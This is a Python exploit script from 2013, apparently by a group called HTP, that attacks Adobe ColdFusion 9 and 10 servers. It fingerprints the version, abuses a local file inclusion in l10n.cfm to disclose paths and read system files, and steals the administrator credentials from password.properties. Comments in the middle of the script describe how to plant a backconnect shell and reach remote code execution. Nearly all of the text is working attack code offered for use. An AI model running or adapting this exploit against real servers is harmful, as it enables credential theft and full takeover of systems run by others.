#!/usr/bin/env python
# -*- coding: utf-8 -*-

intro="""
 _     _ _______  _____       _    _ _______        Cold        ,''' Fusion
 |_____|    |    |_____]       \  /  |______        Cold ,'''  /--   Fusion
 |     |    |    |              \/   ______|.       Cold -,__,'      Fusion

Name        : ColdSub-Zero.pyFusion v2
Description : CF9-10 Remote Root Zeroday
Crew        : HTP
"""
cyan = "\x1b[1;36m"
red = "\x1b[1;31m"
clear = "\x1b[0m"
print intro.replace("Cold",cyan).replace("Fusion",clear)

import requests, time, sys, urllib, hashlib

def flash(color,text,times):
	sys.stdout.write(text)
	line1 = "\x0d\x1b[2K%s%s" % (color,text)
	line2 = "\x0d\x1b[2K%s%s" % (clear,text)
	for x in range(0,times):
		sys.stdout.write(line1)
		sys.stdout.flush()
		time.sleep(.2)
		sys.stdout.write(line2)
		sys.stdout.flush()
		time.sleep(.2)
	print line2

abspath = ""
operatingsystem = "refrigerator"
coldfusion = 0

def fingerprintcf(protocol,target):
	# Fingerprint using md5's of CF 9/10 admin image
	print "[*] Fingerprinting CF 9/10 instance"
	imgdata = requests.get("%s://%s/CFIDE/administrator/images/loginbackground.jpg" % (protocol,target)).content
	md5fingerprint = hashlib.md5(imgdata).hexdigest()
	if md5fingerprint == "a4c81b7a6289b2fc9b36848fa0cae83c":
		print "[*] Detected ColdFusion 10"
		return 10
	elif md5fingerprint == "596b3fc4f1a0b818979db1cf94a82220":
		print "[*] Detected ColdFusion 9"
		return 9
	elif md5fingerprint == "779efc149954677095446c167344dbfc":
		# ColdFusion 8 doesn't have mail.cfm, but it is still exploitable due to l10n parsing the template as CFM.
		# It would require shell data to be on the box to include, such as an uploaded 'picture' or what-not.
		print "[*] Requires inclusion: m4ke your 0wn fuq1ng z3r0d4y!"
		sys.exit(0)
	else:
		print "[*] Unable to fingerprint, continuing with little environment data"
		return None

def getpath(protocol,target):
	# Leverage a path disclosure to get the absolute path on CF9-10
	print "[*] Testing for path disclosure"
	abspathdata = requests.get("%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp" % (protocol,target)).headers
	if "set-cookie" in abspathdata.keys():
		try:
			abspath = urllib.unquote(abspathdata['set-cookie'].split('ANALYZER_DIRECTORY=')[1].split(';')[0])
			print "[*] Absolute path obtained: %s" % abspath
			if abspath[0] == "/":
				print "[*] Detected Linux"
				operatingsystem = "linux"
			elif abspath[1] == ":":
				print "[*] Detected Windows"
				operatingsystem = "windows 95 with bonzibuddy"
			else:
				print "[?] t4rg3t 4pp34r5 t0 b3 runn1n9 0n 4 r3fr1g3r4t0r"
				operatingsystem = "refrigerator"
		except:
			print "[?] OS detection failure. Continuing with fingerprint."
	else:
		print "[?] OS detection failure. Continuing with fingerprint."
	return abspath,operatingsystem

# HTP '13
# Congratulations, you're reading the source.
#
# Subzero v2 is a do-it-yourself Subzero v1. Some details have been provided throughout the source hinting at the potential usage.
# As far as changes, the Null RDS 1day has been removed, as well as the locale + FCKEditor exploitation checks & auth bypass + shell drop.
# If you know what you are doing, this 0day can be used in conjunction with the other 0days to exploit ColdFusion 6-10. (aka everything).
#
# ColdFusion 6 can be taken out with the locale 0day, and XORing password.properties against the stored private key will yield the actual
# login password.
#
# Since you're reading the source, we'll give you another 0day to improve Subzero. Once Subzero has extracted the hash, use scheduled tasks
# to store your backconnect shell in a temp directory (such as the CF temp directory/windows TEMP dir or /dev/shm). Then, use Server Settings
# > Settings in the CF admin to load it as the Missing Template Handler (you can travel upwards from the 'relative path' using ../). Finally,
# trigger a 404 to recieve your backconnect, and restore the Missing Template Handler. We might release fUZE Shell v2 in the future for POCs
# of this written in CFML.
#
# For anyone looking to fully weaponize Subzero into direct RXE for ColdFusion 10, we'll give you a hint. Subzero is a LFI, not a LFD.
# (preinstalled *.cfm) :P

target = raw_input("Target> ")
if "https" in target:
	protocol = "https"
	target = target.replace("http://","").replace("https://","").split("/")[0]
	print "[*] Target set to: %s" % target
	print "[*] HTTPS: Enabled"
else:
	protocol = "http"
	target = target.replace("http://","").replace("https://","").split("/")[0]
	print "[*] Target set to: %s" % target

abspath,operatingsystem = getpath(protocol,target)
coldfusion = fingerprintcf(protocol,target)

print "[*] Collecting additional data about operating system"
etchosts = requests.get("%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../etc/hosts&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp" % (protocol,target)).content
bootini = requests.get("%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../boot.ini&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp" % (protocol,target)).content
if "hosts" in etchosts or "127.0.0.1" in etchosts:
	operatingsystem = "linux"
elif "[boot loader]" in bootini or "[operating systems]" in bootini:
	operatingsystem = "windows 95 with bonzibuddy"
elif operatingsystem is "linux" or "windows 95 with bonzibuddy":
	pass
else:
	operatingsystem = "refrigerator"

if operatingsystem is "refrigerator":
	print "[*] go0d 1uq!!"

print "[*] Obtaining credentials"
tests = ["../../lib/password.properties","..\..\lib\password.properties"]
if operatingsystem is "windows 95 with bonzibuddy":
	if coldfusion == 10:
		tests += ["..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties"]
	elif coldfusion == 9:
		tests += ["..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties"]
	else:
		tests += ["..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties",
                          "..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties"]
elif operatingsystem is "linux":
	if coldfusion == 10:
		tests += ["../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
                          "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties"]
	elif coldfusion == 9:
		tests += ["../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties",
                          "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties"]
	else:
		tests += ["../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties",
                          "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
                          "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties"]
elif operatingsystem is "refrigerator":
	# w3lp l00ks l1k3 w3 g0tt4 5h0tguN th1s sh1t
	tests += ["..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties",
                  "..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties",
                  "..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties",
                  "..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties",
                  "..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties",
                  "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties",
                  "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
                  "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties"]

for path in tests:
	lfidata = requests.get("%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=%s&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp" % (protocol,target,path)).content
	if "encrypted=true" in lfidata:
		credzacquired = True
		print "[*] CF Administrator credentials acquired:"
		print lfidata
	else:
		pass

if credzacquired == True:
	flash(cyan,"[~] SUB ZERO WINS",3)
	time.sleep(.5)
	flash(red,"[!] FLAWLESS VICTORY",3)
	time.sleep(.5)
else:
	flash(red,"[!] COLDFUSION ADMIN WINS",3)
	time.sleep(.5)

# e0f HTP '13